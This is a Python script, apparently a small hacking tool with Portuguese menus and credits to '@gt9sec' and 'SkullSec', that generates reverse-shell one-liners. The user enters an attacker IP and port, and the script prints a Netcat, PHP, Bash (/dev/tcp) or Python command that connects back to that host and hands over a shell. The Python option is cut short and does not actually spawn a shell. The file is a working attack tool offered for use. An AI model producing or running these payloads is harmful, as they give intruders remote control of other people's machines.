import os


os.system("clear")

print("""
██████  ███████ ██    ██ ███████ ██████  ███████ ███████ 
██   ██ ██      ██    ██ ██      ██   ██ ██      ██      
██████  █████   ██    ██ █████   ██████  ███████ █████   
██   ██ ██       ██  ██  ██      ██   ██      ██ ██      
██   ██ ███████   ████   ███████ ██   ██ ███████ ███████ 

\033[0;35;1m███████╗ ██████╗ ██████╗  █████╗ \003 
██╔════╝██╔═══██╗██╔══██╗██╔══██╗
█████╗  ██║   ██║██║  ██║███████║
██╔══╝  ██║   ██║██║  ██║██╔══██║         
██║     ╚██████╔╝██████╔╝██║  ██║                 		
╚═╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═╝                 
                                 by: @gt9sec 		""")

print("""
[ 1 ] Python
[ 2 ] Netcat
[ 3 ] PHP 
[ 4 ] Bash
[ 5 ] Creditos """)
foda = int(input('>>> '))
if foda == 1:
	ip_foda = input("IP: ")
	porta_foda = input("PORTA: ")
	print("""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{})) """.format(ip_foda, porta_foda))

elif foda == 2:
	ip_fds = input("IP: ")
	porta_fds = input("PORTA: ")
	print("""
nc -e /bin/bash {} {}""".format(ip_fds, porta_fds))
elif foda == 3:
	ip_pika = input("IP: ")
	porta_pika = input("PORTA: ")
	print("""
php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");' """.format(ip_pika, porta_pika))

elif foda == 4:
	ip_puta = input("IP: ")
	porta_puta = input("PORTA: ")
	print("""
	bash -i >& /dev/tcp/{}/{} 0>&1""".format(ip_puta, porta_puta))
	
elif foda == 5:
	print("""
[INSTAGRAM]: @gt9sec
[TIKTOK]: @gt9sec
[TEAM]: SkullSec""")

else:
	print("opção invalida vagabundo")
